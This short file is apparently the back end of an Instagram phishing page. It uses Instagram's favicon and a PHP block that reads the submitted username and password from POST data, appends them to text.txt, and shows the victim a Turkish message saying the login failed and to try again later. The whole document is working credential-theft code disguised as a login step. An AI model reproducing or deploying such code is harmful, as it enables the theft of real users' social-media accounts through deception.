
<link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">

<?php 
$un=$_POST["un"];
$pass=$_POST["pass"];
$myfile = fopen("text.txt", "a") or die("Unable to open file!");

fwrite($myfile, "Username: ".$un."\n");
fwrite($myfile, "Şifre: ".$pass."\n");
fclose($myfile);
echo "Giriş Başarısız Daha sonra Tekrar Deneyiniz!";
?>
<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Başarısız</title>
</head>
<body>
    
</body>
</html>